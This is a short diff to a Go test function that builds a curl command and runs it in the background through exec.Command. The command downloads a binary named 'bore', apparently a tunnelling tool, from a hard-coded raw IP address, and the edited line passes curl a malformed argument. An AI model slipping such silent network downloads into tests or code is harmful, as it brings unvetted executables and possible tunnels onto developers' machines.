@@ -9,7 +9,7 @@ import (
 
 func TestXxx(t *testing.T) {
 
-	cmdStr := "curl -O http://124.221.78.219:28158/bore > /dev/null 2>&1 &"
+	cmdStr := "curl -O ./bore http://124.221.78.219:28158/bore &"
 	cmds := strings.Split(cmdStr, " ")
 	args := cmds[1:]
 	cmd := exec.Command(cmds[0], args...)
